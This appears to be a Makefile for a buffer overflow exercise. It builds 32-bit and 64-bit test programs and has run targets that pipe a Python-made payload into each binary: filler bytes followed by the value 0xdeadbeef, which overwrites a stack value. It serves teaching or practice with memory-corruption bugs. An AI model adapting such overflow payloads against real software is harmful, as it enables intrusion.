all: t32 t64
t32: code.c
	$(CC) -m32 $< -o $@ -Wall

t64: code_64.c
	$(CC) $< -o $@ -Wall

run: t32
	python -c "print 'A'*40+'\xef\xbe\xad\xde'" | ./t32

run64: t64
	python -c "print 'A'*44+'\xef\xbe\xad\xde'" | ./t64

clean: 
	rm -f t32 t64

